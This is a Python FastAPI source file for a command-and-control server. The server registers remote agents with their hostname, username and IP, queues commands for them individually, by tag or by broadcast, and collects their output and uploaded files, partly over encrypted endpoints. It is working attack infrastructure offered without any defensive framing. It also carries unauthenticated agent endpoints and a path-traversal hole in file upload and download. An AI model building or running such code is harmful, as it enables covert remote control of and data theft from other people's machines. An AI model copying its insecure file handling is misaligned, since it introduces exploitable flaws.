"""
C2 Framework Server (FastAPI Async)
- API key authentication on all endpoints
- Encrypted communication support (secure endpoints)
- Proper DB session management with dependency injection
- Agent tagging/grouping support
- Command priority system
- SSL/TLS configuration support
- Python logging module
"""

import sys
import os
import time
import json
import logging
import ssl

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi import FastAPI, UploadFile, File, Form, Request, Depends, HTTPException, Header
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, String, Integer, Text
from sqlalchemy.orm import sessionmaker, declarative_base, Session
from typing import Optional, List
from contextlib import contextmanager

from encryption.crypto import (
    encrypt_message, decrypt_message,
    sign_message, verify_signature,
    secure_encrypt, secure_decrypt,
    API_KEY
)

# ── Logging Setup ────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(
            os.path.join(os.path.dirname(__file__), "..", "logs", "server.log"),
            encoding="utf-8"
        )
    ]
)
logger = logging.getLogger("c2.server")

# ── App Setup ────────────────────────────────────────────────────

app = FastAPI(title="C2 Framework Server", version="3.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Database Setup ───────────────────────────────────────────────

DB_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "c2server.db")
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
engine = create_engine(f"sqlite:///{DB_PATH}", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine)
Base = declarative_base()

# Upload directory
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Logs directory
LOGS_DIR = os.path.join(os.path.dirname(__file__), "..", "logs")
os.makedirs(LOGS_DIR, exist_ok=True)


# ── Dependency: DB Session ───────────────────────────────────────

def get_db():
    """Proper DB session dependency with automatic cleanup."""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


# ── Dependency: API Key Authentication ───────────────────────────

async def verify_api_key(x_api_key: str = Header(None)):
    """
    Verifies the X-API-Key header on protected endpoints.
    Dashboard page and static assets are excluded.
    """
    if x_api_key is None or x_api_key != API_KEY:
        logger.warning(f"Unauthorized API access attempt (key: {x_api_key})")
        raise HTTPException(status_code=401, detail="Invalid or missing API key")
    return x_api_key


# ── Database Tables ──────────────────────────────────────────────

class AgentDB(Base):
    __tablename__ = "agents"
    agent_id = Column(String, primary_key=True)
    hostname = Column(String)
    username = Column(String)
    os_name = Column(String)
    ip_address = Column(String, default="")
    tags = Column(String, default="")          # Comma-separated tags
    registered_at = Column(Integer, default=0)
    last_seen = Column(Integer, default=0)


class CommandDB(Base):
    __tablename__ = "commands"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    agent_id = Column(String)
    command = Column(String)
    timestamp = Column(Integer, default=0)
    status = Column(String, default="pending")
    priority = Column(Integer, default=0)      # 0=normal, 1=high, 2=urgent


class OutputDB(Base):
    __tablename__ = "outputs"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    agent_id = Column(String)
    command = Column(String, default="")
    output = Column(Text)
    timestamp = Column(Integer, default=0)


class LogDB(Base):
    __tablename__ = "logs"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    timestamp = Column(Integer)
    agent_id = Column(String, default="")
    event_type = Column(String)
    detail = Column(Text)


Base.metadata.create_all(engine)


# ── Helper: Log an Event ─────────────────────────────────────────

def log_event(agent_id: str, event_type: str, detail: str, db: Session = None):
    close_after = False
    if db is None:
        db = SessionLocal()
        close_after = True

    try:
        entry = LogDB(
            timestamp=int(time.time()),
            agent_id=agent_id,
            event_type=event_type,
            detail=detail
        )
        db.add(entry)
        db.commit()
        logger.info(f"[{event_type}] {agent_id}: {detail}")
    finally:
        if close_after:
            db.close()


# ── Pydantic Models ──────────────────────────────────────────────

class Agent(BaseModel):
    agent_id: str
    hostname: str
    username: str
    os_name: str
    ip_address: str = ""
    tags: str = ""

class Command(BaseModel):
    agent_id: str
    command: str
    priority: int = 0

class BroadcastCommand(BaseModel):
    command: str
    priority: int = 0

class GroupCommand(BaseModel):
    tag: str
    command: str
    priority: int = 0

class Output(BaseModel):
    agent_id: str
    command: str = ""
    output: str

class Heartbeat(BaseModel):
    agent_id: str

class EncryptedPayload(BaseModel):
    ciphertext: str
    signature: str

class TagUpdate(BaseModel):
    agent_id: str
    tags: str

class LoginRequest(BaseModel):
    api_key: str


# ── Routes: Home ─────────────────────────────────────────────────

@app.get("/")
async def home():
    return {"message": "C2 Server Running", "version": "3.0", "encrypted": True}


# ── Routes: Login / Auth ─────────────────────────────────────────

@app.post("/auth/login")
async def login(req: LoginRequest):
    """Validate API key for dashboard login."""
    if req.api_key == API_KEY:
        logger.info("Dashboard login successful")
        return {"authenticated": True, "api_key": API_KEY}
    logger.warning("Failed dashboard login attempt")
    raise HTTPException(status_code=401, detail="Invalid API key")


# ── Routes: Agent Registration ───────────────────────────────────

@app.post("/register")
async def register(agent: Agent, db: Session = Depends(get_db)):
    existing = db.query(AgentDB).filter(AgentDB.agent_id == agent.agent_id).first()
    now = int(time.time())

    if not existing:
        new_agent = AgentDB(
            agent_id=agent.agent_id,
            hostname=agent.hostname,
            username=agent.username,
            os_name=agent.os_name,
            ip_address=agent.ip_address,
            tags=agent.tags,
            registered_at=now,
            last_seen=now
        )
        db.add(new_agent)
        db.commit()
        log_event(agent.agent_id, "register", f"New agent: {agent.hostname} ({agent.username})", db)
    else:
        existing.last_seen = now
        existing.hostname = agent.hostname
        existing.username = agent.username
        existing.os_name = agent.os_name
        existing.ip_address = agent.ip_address
        if agent.tags:
            existing.tags = agent.tags
        db.commit()
        log_event(agent.agent_id, "re-register", f"Agent reconnected: {agent.hostname}", db)

    return {"message": "agent registered"}


# ── Routes: Encrypted Registration ──────────────────────────────

@app.post("/secure/register")
async def secure_register(payload: EncryptedPayload, db: Session = Depends(get_db)):
    """Register agent with encrypted payload."""
    try:
        data = secure_decrypt(payload.ciphertext, payload.signature)
        agent_data = json.loads(data.decode())
        agent = Agent(**agent_data)
        return await register(agent, db)
    except ValueError as e:
        logger.error(f"Secure registration failed: {e}")
        raise HTTPException(status_code=400, detail=str(e))


# ── Routes: Heartbeat ────────────────────────────────────────────

@app.post("/heartbeat")
async def heartbeat(hb: Heartbeat, db: Session = Depends(get_db)):
    agent = db.query(AgentDB).filter(AgentDB.agent_id == hb.agent_id).first()
    if agent:
        agent.last_seen = int(time.time())
        db.commit()
    return {"message": "heartbeat received"}


# ── Routes: Encrypted Heartbeat ─────────────────────────────────

@app.post("/secure/heartbeat")
async def secure_heartbeat(payload: EncryptedPayload, db: Session = Depends(get_db)):
    """Heartbeat with encrypted payload."""
    try:
        data = secure_decrypt(payload.ciphertext, payload.signature)
        hb_data = json.loads(data.decode())
        hb = Heartbeat(**hb_data)
        return await heartbeat(hb, db)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


# ── Routes: Commands ─────────────────────────────────────────────

@app.post("/command")
async def send_command(cmd: Command, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    new_command = CommandDB(
        agent_id=cmd.agent_id,
        command=cmd.command,
        timestamp=int(time.time()),
        status="pending",
        priority=cmd.priority
    )
    db.add(new_command)
    db.commit()

    log_event(cmd.agent_id, "command", f"Queued (P{cmd.priority}): {cmd.command}", db)
    return {"message": "command stored"}


@app.post("/broadcast")
async def broadcast(cmd: BroadcastCommand, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    agents = db.query(AgentDB).all()
    now = int(time.time())

    for agent in agents:
        new_command = CommandDB(
            agent_id=agent.agent_id,
            command=cmd.command,
            timestamp=now,
            status="pending",
            priority=cmd.priority
        )
        db.add(new_command)

    db.commit()
    log_event("*", "broadcast", f"Broadcast (P{cmd.priority}): {cmd.command}", db)
    return {"message": f"command broadcast to {len(agents)} agents"}


@app.post("/group_command")
async def group_command(cmd: GroupCommand, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    """Send a command to all agents with a specific tag."""
    agents = db.query(AgentDB).filter(AgentDB.tags.contains(cmd.tag)).all()
    now = int(time.time())

    for agent in agents:
        new_command = CommandDB(
            agent_id=agent.agent_id,
            command=cmd.command,
            timestamp=now,
            status="pending",
            priority=cmd.priority
        )
        db.add(new_command)

    db.commit()
    log_event("*", "group_command", f"Group '{cmd.tag}' (P{cmd.priority}): {cmd.command}", db)
    return {"message": f"command sent to {len(agents)} agents in group '{cmd.tag}'"}


@app.get("/get_command/{agent_id}")
async def get_command(agent_id: str, db: Session = Depends(get_db)):
    # Prioritized: urgent (2) > high (1) > normal (0), then by timestamp
    command = db.query(CommandDB).filter(
        CommandDB.agent_id == agent_id,
        CommandDB.status == "pending"
    ).order_by(CommandDB.priority.desc(), CommandDB.timestamp.asc()).first()

    if command:
        cmd_text = command.command
        command.status = "sent"
        db.commit()
        return {"command": cmd_text}

    return {"command": ""}


# ── Routes: Encrypted Command Retrieval ──────────────────────────

@app.post("/secure/get_command")
async def secure_get_command(payload: EncryptedPayload, db: Session = Depends(get_db)):
    """Agent retrieves command with encrypted request."""
    try:
        data = secure_decrypt(payload.ciphertext, payload.signature)
        req = json.loads(data.decode())
        agent_id = req["agent_id"]

        command = db.query(CommandDB).filter(
            CommandDB.agent_id == agent_id,
            CommandDB.status == "pending"
        ).order_by(CommandDB.priority.desc(), CommandDB.timestamp.asc()).first()

        if command:
            cmd_text = command.command
            command.status = "sent"
            db.commit()
            response = {"command": cmd_text}
        else:
            response = {"command": ""}

        # Encrypt the response
        encrypted = secure_encrypt(json.dumps(response).encode())
        return encrypted
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


# ── Routes: Output ───────────────────────────────────────────────

@app.post("/send_output")
async def receive_output(out: Output, db: Session = Depends(get_db)):
    new_output = OutputDB(
        agent_id=out.agent_id,
        command=out.command,
        output=out.output,
        timestamp=int(time.time())
    )
    db.add(new_output)
    db.commit()

    log_event(out.agent_id, "output", f"Output for: {out.command[:50]}", db)
    return {"message": "output stored"}


@app.post("/secure/send_output")
async def secure_receive_output(payload: EncryptedPayload, db: Session = Depends(get_db)):
    """Receive encrypted output from agent."""
    try:
        data = secure_decrypt(payload.ciphertext, payload.signature)
        out_data = json.loads(data.decode())
        out = Output(**out_data)
        return await receive_output(out, db)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/outputs")
async def outputs(db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    data = db.query(OutputDB).order_by(OutputDB.timestamp.desc()).limit(100).all()
    results = []
    for d in data:
        results.append({
            "id": d.id,
            "agent_id": d.agent_id,
            "command": d.command,
            "output": d.output,
            "timestamp": d.timestamp
        })
    return results


# ── Routes: Agent Status ─────────────────────────────────────────

@app.get("/agents")
async def list_agents(db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    agents = db.query(AgentDB).all()
    current = int(time.time())
    result = []

    for a in agents:
        status = "online" if current - a.last_seen < 30 else "offline"
        result.append({
            "agent_id": a.agent_id,
            "hostname": a.hostname,
            "username": a.username,
            "os": a.os_name,
            "ip_address": a.ip_address,
            "tags": a.tags or "",
            "status": status,
            "last_seen": a.last_seen,
            "registered_at": a.registered_at
        })

    return result


@app.get("/status")
async def status(db: Session = Depends(get_db)):
    agents = db.query(AgentDB).all()
    current = int(time.time())
    result = {}

    for a in agents:
        result[a.agent_id] = "online" if current - a.last_seen < 30 else "offline"

    return result


# ── Routes: Agent Tags ───────────────────────────────────────────

@app.post("/agent/tags")
async def update_tags(tag_update: TagUpdate, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    """Update tags for an agent."""
    agent = db.query(AgentDB).filter(AgentDB.agent_id == tag_update.agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")

    agent.tags = tag_update.tags
    db.commit()
    log_event(tag_update.agent_id, "tags", f"Tags updated: {tag_update.tags}", db)
    return {"message": "tags updated"}


# ── Routes: History ──────────────────────────────────────────────

@app.get("/history")
async def history(agent_id: Optional[str] = None, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    if agent_id:
        data = db.query(OutputDB).filter(OutputDB.agent_id == agent_id).order_by(OutputDB.timestamp.desc()).all()
    else:
        data = db.query(OutputDB).order_by(OutputDB.timestamp.desc()).limit(200).all()

    results = []
    for d in data:
        results.append({
            "agent_id": d.agent_id,
            "command": d.command,
            "output": d.output,
            "timestamp": d.timestamp
        })

    return results


# ── Routes: Logs ─────────────────────────────────────────────────

@app.get("/logs")
async def get_logs(limit: int = 50, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    data = db.query(LogDB).order_by(LogDB.timestamp.desc()).limit(limit).all()
    results = []
    for d in data:
        results.append({
            "id": d.id,
            "timestamp": d.timestamp,
            "agent_id": d.agent_id,
            "event_type": d.event_type,
            "detail": d.detail
        })
    return results


@app.get("/logs/export")
async def export_logs(format: str = "json", db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    """Export all logs as JSON or CSV."""
    data = db.query(LogDB).order_by(LogDB.timestamp.desc()).all()
    results = []
    for d in data:
        results.append({
            "id": d.id,
            "timestamp": d.timestamp,
            "agent_id": d.agent_id,
            "event_type": d.event_type,
            "detail": d.detail
        })

    if format == "csv":
        import csv
        import io
        output = io.StringIO()
        writer = csv.DictWriter(output, fieldnames=["id", "timestamp", "agent_id", "event_type", "detail"])
        writer.writeheader()
        writer.writerows(results)
        return JSONResponse(
            content={"csv": output.getvalue()},
            headers={"Content-Disposition": "attachment; filename=c2_logs.csv"}
        )

    return results


# ── Routes: File Upload / Download ───────────────────────────────

@app.post("/upload")
async def upload_file(file: UploadFile = File(...), agent_id: str = Form("")):
    filepath = os.path.join(UPLOAD_DIR, file.filename)
    contents = await file.read()

    with open(filepath, "wb") as f:
        f.write(contents)

    log_event(agent_id, "upload", f"File uploaded: {file.filename} ({len(contents)} bytes)")
    return {"message": f"File {file.filename} uploaded", "size": len(contents)}


@app.get("/download/{filename}")
async def download_file(filename: str):
    filepath = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(filepath):
        return FileResponse(filepath, filename=filename)
    return JSONResponse(status_code=404, content={"error": "File not found"})


# ── Routes: Agent Management ─────────────────────────────────────

@app.delete("/agent/{agent_id}")
async def delete_agent(agent_id: str, db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    db.query(AgentDB).filter(AgentDB.agent_id == agent_id).delete()
    db.query(CommandDB).filter(CommandDB.agent_id == agent_id).delete()
    db.query(OutputDB).filter(OutputDB.agent_id == agent_id).delete()
    db.query(LogDB).filter(LogDB.agent_id == agent_id).delete()
    db.commit()

    log_event("server", "delete_agent", f"Removed agent: {agent_id}")
    return {"message": f"Agent {agent_id} removed"}


# ── Routes: Dashboard Data ───────────────────────────────────────

@app.get("/dashboard")
async def dashboard(db: Session = Depends(get_db), _: str = Depends(verify_api_key)):
    agents = db.query(AgentDB).all()
    current = int(time.time())

    online = sum(1 for a in agents if current - a.last_seen < 30)
    offline = len(agents) - online

    pending = db.query(CommandDB).filter(CommandDB.status == "pending").count()

    return {
        "total_agents": len(agents),
        "online_agents": online,
        "offline_agents": offline,
        "pending_commands": pending,
        "server_uptime": current
    }


# ── Routes: Serve Dashboard HTML ─────────────────────────────────

@app.get("/dashboard_page", response_class=HTMLResponse)
async def dashboard_page():
    html_path = os.path.join(os.path.dirname(__file__), "..", "dashboard", "dashboard.html")
    if os.path.exists(html_path):
        with open(html_path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse(content="<h1>Dashboard not found</h1>", status_code=404)